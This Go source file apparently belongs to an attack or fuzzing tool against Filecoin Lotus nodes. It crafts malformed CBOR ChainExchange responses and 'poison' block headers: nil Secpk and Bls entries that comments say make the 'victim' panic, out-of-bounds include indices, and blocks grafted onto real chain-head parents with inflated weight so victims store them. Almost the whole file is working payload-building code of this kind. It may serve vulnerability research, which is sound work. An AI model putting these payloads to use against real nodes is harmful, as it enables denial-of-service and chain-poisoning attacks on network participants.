package main

import (
	"bytes"
	"crypto/sha256"

	cbg "github.com/whyrusleeping/cbor-gen"

	"github.com/ipfs/go-cid"
	"github.com/multiformats/go-multihash"
)

// ---------------------------------------------------------------------------
// Raw CBOR construction helpers
//
// These build CBOR byte sequences directly — NOT via Lotus type serialization.
// This is intentional: we want to craft malformed payloads that cannot be
// produced by the normal type constructors.
// ---------------------------------------------------------------------------

// randomCID generates a random CID (sha2-256 multihash of random bytes).
func randomCID() cid.Cid {
	data := randomBytes(32)
	h := sha256.Sum256(data)
	mh, _ := multihash.Encode(h[:], multihash.SHA2_256)
	return cid.NewCidV1(cid.DagCBOR, mh)
}

// cborArray writes a CBOR array header followed by concatenated elements.
func cborArray(elements ...[]byte) []byte {
	var buf bytes.Buffer
	cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, uint64(len(elements)))
	for _, e := range elements {
		buf.Write(e)
	}
	return buf.Bytes()
}

// cborUint64 encodes a uint64 as CBOR major type 0.
func cborUint64(v uint64) []byte {
	var buf bytes.Buffer
	cbg.WriteMajorTypeHeader(&buf, cbg.MajUnsignedInt, v)
	return buf.Bytes()
}

// cborBytes encodes a byte string as CBOR major type 2.
func cborBytes(b []byte) []byte {
	var buf bytes.Buffer
	cbg.WriteMajorTypeHeader(&buf, cbg.MajByteString, uint64(len(b)))
	buf.Write(b)
	return buf.Bytes()
}

// cborTextString encodes a text string as CBOR major type 3.
func cborTextString(s string) []byte {
	var buf bytes.Buffer
	cbg.WriteMajorTypeHeader(&buf, cbg.MajTextString, uint64(len(s)))
	buf.WriteString(s)
	return buf.Bytes()
}

// cborNil returns CBOR null (0xf6).
func cborNil() []byte {
	return []byte{0xf6}
}

// cborCID encodes a CID as CBOR tag 42 + byte string (standard dag-cbor CID encoding).
func cborCID(c cid.Cid) []byte {
	var buf bytes.Buffer
	// CBOR tag 42 for CID
	cbg.WriteMajorTypeHeader(&buf, cbg.MajTag, 42)
	// CID bytes with 0x00 prefix (multibase identity)
	cidBytes := c.Bytes()
	tagged := make([]byte, len(cidBytes)+1)
	tagged[0] = 0x00
	copy(tagged[1:], cidBytes)
	cbg.WriteMajorTypeHeader(&buf, cbg.MajByteString, uint64(len(tagged)))
	buf.Write(tagged)
	return buf.Bytes()
}

// cborCIDArray encodes a CBOR array of CIDs.
func cborCIDArray(cids []cid.Cid) []byte {
	elements := make([][]byte, len(cids))
	for i, c := range cids {
		elements[i] = cborCID(c)
	}
	return cborArray(elements...)
}

// cborInt64 encodes a signed int64 as CBOR (major type 0 for positive, major type 1 for negative).
func cborInt64(v int64) []byte {
	if v >= 0 {
		return cborUint64(uint64(v))
	}
	var buf bytes.Buffer
	cbg.WriteMajorTypeHeader(&buf, cbg.MajNegativeInt, uint64(-v-1))
	return buf.Bytes()
}

// cborBool encodes a boolean as CBOR (0xf5 = true, 0xf4 = false).
func cborBool(v bool) []byte {
	if v {
		return []byte{0xf5}
	}
	return []byte{0xf4}
}

// ---------------------------------------------------------------------------
// ChainExchange wire format builders
//
// Response = CBOR array(3) [status uint64, errorMessage string, chain []BSTipSet]
// BSTipSet = CBOR array(2) [blocks []BlockHeader, messages CompactedMessages]
// CompactedMessages = CBOR array(4) [bls []Message, blsIncludes [][]uint64, secpk []SignedMessage, secpkIncludes [][]uint64]
// BlockHeader = CBOR array(16) [Miner, Ticket, ElectionProof, ...]
// ---------------------------------------------------------------------------

// buildResponseCBOR constructs a ChainExchange Response.
// chain is a slice of pre-serialized BSTipSet CBOR bytes.
func buildResponseCBOR(status uint64, errMsg string, chain [][]byte) []byte {
	var chainArray bytes.Buffer
	cbg.WriteMajorTypeHeader(&chainArray, cbg.MajArray, uint64(len(chain)))
	for _, ts := range chain {
		chainArray.Write(ts)
	}
	return cborArray(
		cborUint64(status),
		cborTextString(errMsg),
		chainArray.Bytes(),
	)
}

// buildBSTipSetCBOR constructs a BSTipSet.
// blocks is a slice of pre-serialized BlockHeader CBOR bytes.
// messages is pre-serialized CompactedMessages CBOR bytes.
func buildBSTipSetCBOR(blocks [][]byte, messages []byte) []byte {
	var blocksArray bytes.Buffer
	cbg.WriteMajorTypeHeader(&blocksArray, cbg.MajArray, uint64(len(blocks)))
	for _, b := range blocks {
		blocksArray.Write(b)
	}
	return cborArray(blocksArray.Bytes(), messages)
}

// buildEmptyCompactedMsgsCBOR returns CompactedMessages with no messages,
// properly structured for a single-block tipset.
func buildEmptyCompactedMsgsCBOR() []byte {
	return cborArray(
		cborArray(),            // Bls: []
		cborArray(cborArray()), // BlsIncludes: [[]]
		cborArray(),            // Secpk: []
		cborArray(cborArray()), // SecpkIncludes: [[]]
	)
}

// buildNilSecpkCompactedMsgsCBOR returns CompactedMessages with a nil entry
// in the Secpk array. The victim calls .Cid() on the nil → panic.
func buildNilSecpkCompactedMsgsCBOR() []byte {
	return cborArray(
		cborArray(),                         // Bls: []
		cborArray(cborArray()),              // BlsIncludes: [[]]
		cborArray(cborNil()),                // Secpk: [null]
		cborArray(cborArray(cborUint64(0))), // SecpkIncludes: [[0]]
	)
}

// buildNilBlsCompactedMsgsCBOR returns CompactedMessages with a nil entry
// in the Bls array.
func buildNilBlsCompactedMsgsCBOR() []byte {
	return cborArray(
		cborArray(cborNil()),                // Bls: [null]
		cborArray(cborArray(cborUint64(0))), // BlsIncludes: [[0]]
		cborArray(),                         // Secpk: []
		cborArray(cborArray()),              // SecpkIncludes: [[]]
	)
}

// buildOOBBlsIndexMsgsCBOR returns CompactedMessages with an out-of-bounds
// index in BlsIncludes.
func buildOOBBlsIndexMsgsCBOR() []byte {
	return cborArray(
		cborArray(),                             // Bls: [] (empty)
		cborArray(cborArray(cborUint64(99999))), // BlsIncludes: [[99999]] (OOB)
		cborArray(),                             // Secpk: []
		cborArray(cborArray()),                  // SecpkIncludes: [[]]
	)
}

// buildOOBSecpkIndexMsgsCBOR returns CompactedMessages with an out-of-bounds
// index in SecpkIncludes.
func buildOOBSecpkIndexMsgsCBOR() []byte {
	return cborArray(
		cborArray(),                             // Bls: []
		cborArray(cborArray()),                  // BlsIncludes: [[]]
		cborArray(),                             // Secpk: [] (empty)
		cborArray(cborArray(cborUint64(99999))), // SecpkIncludes: [[99999]] (OOB)
	)
}

// ---------------------------------------------------------------------------
// BlockHeader CBOR builder (16-field array)
//
// Fields: [Miner, Ticket, ElectionProof, BeaconEntries, WinPoStProof,
//          Parents, ParentWeight, Height, ParentStateRoot, ParentMessageReceipts,
//          Messages, BLSAggregate, Timestamp, BlockSig, ForkSignaling, ParentBaseFee]
// ---------------------------------------------------------------------------

// blockHeaderOpts controls which fields to nil out in a poison block.
type blockHeaderOpts struct {
	nilTicket        bool
	nilElectionProof bool
	nilBLSAggregate  bool
	nilBlockSig      bool
	nilBeaconEntries bool
	nilParents       bool
	emptyParents     bool
	allNil           bool

	// overrideCIDs lets multiple blocks share the same parent/state CIDs
	// so they form a valid multi-block tipset (same parents + height).
	overrideCIDs *sharedBlockCIDs
	// overrideMiner lets each block in a multi-block tipset have a distinct miner
	overrideMiner []byte

	// overrideParentCIDs uses real chain-head CIDs as parents so the victim
	// can verify chain ancestry and actually stores the block.
	overrideParentCIDs []cid.Cid
	// overrideHeight sets the block height (used with overrideParentCIDs to
	// place the poison block at real_height + 1).
	overrideHeight uint64
	// overrideWeight sets the ParentWeight field (used to make the block
	// appear heavier than the victim's current chain).
	overrideWeight uint64
}

// sharedBlockCIDs holds pre-generated CIDs that multiple blocks can share
// so they appear to be in the same tipset (same parents, height, state roots).
type sharedBlockCIDs struct {
	parentCID   cid.Cid
	stateRoot   cid.Cid
	msgReceipts cid.Cid
	messagesCID cid.Cid
}

func newSharedBlockCIDs() *sharedBlockCIDs {
	return &sharedBlockCIDs{
		parentCID:   randomCID(),
		stateRoot:   randomCID(),
		msgReceipts: randomCID(),
		messagesCID: randomCID(),
	}
}

// buildBlockHeaderCBOR constructs a 16-field BlockHeader CBOR array.
func buildBlockHeaderCBOR(opts blockHeaderOpts) []byte {
	dummyCID := randomCID()

	// Use shared CIDs if provided (for multi-block tipsets)
	if opts.overrideCIDs != nil {
		dummyCID = opts.overrideCIDs.parentCID
	}

	// Field 0: Miner (address — CBOR bytes of address payload)
	var miner []byte
	if opts.overrideMiner != nil {
		miner = cborBytes(opts.overrideMiner)
	} else {
		// ID address f01000 = protocol byte 0x00 + varint 1000 (0xe807)
		miner = cborBytes([]byte{0x00, 0xe8, 0x07})
	}

	// Field 1: Ticket — [VRFProof bytes] or null
	var ticket []byte
	if opts.nilTicket || opts.allNil {
		ticket = cborNil()
	} else {
		ticket = cborArray(cborBytes(randomBytes(32)))
	}

	// Field 2: ElectionProof — [WinCount int64, VRFProof bytes] or null
	var electionProof []byte
	if opts.nilElectionProof || opts.allNil {
		electionProof = cborNil()
	} else {
		electionProof = cborArray(cborInt64(1), cborBytes(randomBytes(32)))
	}

	// Field 3: BeaconEntries — array or null
	var beaconEntries []byte
	if opts.nilBeaconEntries || opts.allNil {
		beaconEntries = cborNil()
	} else {
		beaconEntries = cborArray() // empty array
	}

	// Field 4: WinPoStProof — empty array
	winPoStProof := cborArray()

	// Field 5: Parents — array of CIDs
	var parents []byte
	if opts.nilParents || opts.allNil {
		parents = cborNil()
	} else if opts.emptyParents {
		parents = cborArray()
	} else if len(opts.overrideParentCIDs) > 0 {
		parents = cborCIDArray(opts.overrideParentCIDs)
	} else {
		parents = cborCIDArray([]cid.Cid{dummyCID})
	}

	// Field 6: ParentWeight — BigInt bytes
	weight := uint64(1)
	if opts.overrideWeight > 0 {
		weight = opts.overrideWeight
	}
	parentWeight := cborBytes(bigIntBytes(weight))

	// Field 7: Height — uint64
	h := uint64(1)
	if opts.overrideHeight > 0 {
		h = opts.overrideHeight
	}
	height := cborUint64(h)

	// Field 8: ParentStateRoot — CID
	stateRootCID := dummyCID
	if opts.overrideCIDs != nil {
		stateRootCID = opts.overrideCIDs.stateRoot
	}
	parentStateRoot := cborCID(stateRootCID)

	// Field 9: ParentMessageReceipts — CID (use valid empty AMT root)
	msgReceiptsCID := emptyAMTCID
	if opts.overrideCIDs != nil {
		msgReceiptsCID = opts.overrideCIDs.msgReceipts
	}
	parentMsgReceipts := cborCID(msgReceiptsCID)

	// Field 10: Messages — CID (must match CompactedMessages for block to be persisted)
	messagesCIDVal := emptyMsgMetaCID
	if opts.overrideCIDs != nil {
		messagesCIDVal = opts.overrideCIDs.messagesCID
	}
	messages := cborCID(messagesCIDVal)

	// Field 11: BLSAggregate — Signature encoded as CBOR byte string via MarshalBinary
	// Filecoin Signature binary format: [type_byte | data_bytes]
	// BLS type = 2
	var blsAggregate []byte
	if opts.nilBLSAggregate || opts.allNil {
		blsAggregate = cborNil()
	} else {
		blsAggregate = cborBytes([]byte{0x02}) // BLS type=2, empty sig data
	}

	// Field 12: Timestamp — uint64
	timestamp := cborUint64(1700000000)

	// Field 13: BlockSig — Signature encoded as CBOR byte string via MarshalBinary
	// Filecoin Signature binary format: [type_byte | data_bytes]
	// BLS type = 2
	var blockSig []byte
	if opts.nilBlockSig || opts.allNil {
		blockSig = cborNil()
	} else {
		blockSig = cborBytes(append([]byte{0x02}, randomBytes(8)...))
	}

	// Field 14: ForkSignaling — uint64
	forkSignaling := cborUint64(0)

	// Field 15: ParentBaseFee — BigInt bytes
	parentBaseFee := cborBytes(bigIntBytes(100))

	return cborArray(
		miner, ticket, electionProof, beaconEntries, winPoStProof,
		parents, parentWeight, height, parentStateRoot, parentMsgReceipts,
		messages, blsAggregate, timestamp, blockSig, forkSignaling, parentBaseFee,
	)
}

// blockCIDFromCBOR computes the CID of a CBOR-encoded BlockHeader.
// Uses blake2b-256 hash (matching Filecoin's CID builder).
func blockCIDFromCBOR(blockCBOR []byte) cid.Cid {
	mh, _ := multihash.Sum(blockCBOR, multihash.BLAKE2B_MIN+31, -1)
	return cid.NewCidV1(cid.DagCBOR, mh)
}

// parseRequestOptions extracts the Options uint64 from a ChainExchange request.
// Request wire format: CBOR array(3) [Head []CID, Length uint64, Options uint64]
// Returns 0 on any parse error (safe default — no headers, no messages).
func parseRequestOptions(data []byte) uint64 {
	if len(data) < 2 {
		return 0
	}
	r := bytes.NewReader(data)

	// Read array header (expect 3 elements)
	maj, _, err := cbg.CborReadHeader(r)
	if err != nil || maj != cbg.MajArray {
		return 0
	}

	// Skip Head: array of CIDs — read inner array header then skip each element
	maj, nCIDs, err := cbg.CborReadHeader(r)
	if err != nil || maj != cbg.MajArray {
		return 0
	}
	for i := uint64(0); i < nCIDs; i++ {
		// Each CID is: tag(42) + bytestring
		maj, _, err := cbg.CborReadHeader(r)
		if err != nil {
			return 0
		}
		if maj == cbg.MajTag {
			// Read the byte string after tag
			maj, bsLen, err := cbg.CborReadHeader(r)
			if err != nil || maj != cbg.MajByteString {
				return 0
			}
			r.Seek(int64(bsLen), 1) // skip bytes
		}
	}

	// Skip Length uint64
	maj, _, err = cbg.CborReadHeader(r)
	if err != nil || maj != cbg.MajUnsignedInt {
		return 0
	}

	// Read Options uint64
	maj, options, err := cbg.CborReadHeader(r)
	if err != nil || maj != cbg.MajUnsignedInt {
		return 0
	}
	return options
}

// bigIntBytes encodes a big integer value as Filecoin-style BigInt bytes.
// Filecoin BigInt: first byte is sign (0x00 = positive), rest is big-endian value.
func bigIntBytes(v uint64) []byte {
	if v == 0 {
		return []byte{}
	}
	// Encode as big-endian, strip leading zeros
	raw := make([]byte, 8)
	for i := 7; i >= 0; i-- {
		raw[i] = byte(v & 0xff)
		v >>= 8
	}
	// Strip leading zeros
	start := 0
	for start < len(raw)-1 && raw[start] == 0 {
		start++
	}
	// Prepend sign byte (0x00 = positive)
	result := make([]byte, 1+len(raw)-start)
	result[0] = 0x00
	copy(result[1:], raw[start:])
	return result
}
